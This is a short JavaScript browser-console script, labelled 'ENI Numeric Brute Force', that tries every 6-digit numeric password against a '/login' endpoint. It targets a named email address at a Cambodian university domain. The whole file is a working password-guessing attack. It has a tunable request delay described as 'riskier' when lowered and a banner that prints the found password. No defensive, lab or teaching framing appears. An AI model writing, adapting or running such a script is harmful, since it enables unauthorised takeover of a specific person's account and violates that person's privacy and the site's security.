// ENI Numeric Brute Force - Configurable Range
const targetEmail = "peng.kun@rupp.edu.kh";

// CONFIGURE THESE BASED ON WHAT YOU REMEMBER:
const digitLength = 6;        // 6 or 8
const startFrom = 0;          // Start here (e.g., 100000 if you know it's 6 digits and starts with 1)
const endAt = 999999;         // End here
const delay = 500;            // ms between requests (lower = faster, but riskier)

console.log('%c[ENI] Numeric brute force initiated...', 'color: #2f6fce; font-size: 16px; font-weight: bold;');
console.log(`%c[ENI] Range: ${startFrom} to ${endAt} (${digitLength} digits)`, 'color: #9333ea; font-weight: bold;');
console.log('%c[ENI] Press Ctrl+C in console to abort anytime.', 'color: #f59e0b;');

let tested = 0;
let found = false;

async function tryPassword(num) {
  const password = String(num).padStart(digitLength, '0');
  const hash = "00000000000000000000000000000000";
  
  try {
    const r = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: targetEmail,
        password: password,
        hash: hash,
        device_type: "desktop",
        os_name: "Windows",
        browser_name: "Chrome"
      })
    });
    
    const text = await r.text();
    const lines = text.trim().split('\n');
    const jsonLine = lines.find(l => l.includes('"success"') || l.includes('"message"'));
    
    if (jsonLine) {
      const data = JSON.parse(jsonLine);
      if (data.message !== "Wrong password.") {
        console.log('%c[ENI] ╔══════════════════════════════════════╗', 'color: #16a34a; font-size: 16px;');
        console.log('%c[ENI] ║  !!! PASSWORD FOUND !!!              ║', 'color: #16a34a; font-size: 16px; font-weight: bold;');
        console.log(`%c[ENI] ║  Password: ${password}`, 'color: #16a34a; font-size: 16px; font-weight: bold;');
        console.log('%c[ENI] ╚══════════════════════════════════════╝', 'color: #16a34a; font-size: 16px;');
        console.log('%c[ENI] Response:', 'color: #16a34a;', data);
        found = true;
        return true;
      }
    }
    
    tested++;
    if (tested % 50 === 0) {
      console.log(`%c[ENI] Progress: ${tested} tested... last: ${password}`, 'color: #a66b18;');
    }
    
  } catch(e) {
    console.log(`%c[ENI] Network error at ${password}: ${e.message}`, 'color: #f59e0b;');
  }
  return false;
}

async function run() {
  for (let num = startFrom; num <= endAt; num++) {
    if (found) break;
    const success = await tryPassword(num);
    if (success) break;
    await new Promise(r => setTimeout(r, delay));
  }
  if (!found) {
    console.log('%c[ENI] Range exhausted. No match.', 'color: #dc2626; font-size: 14px; font-weight: bold;');
  }
}

run();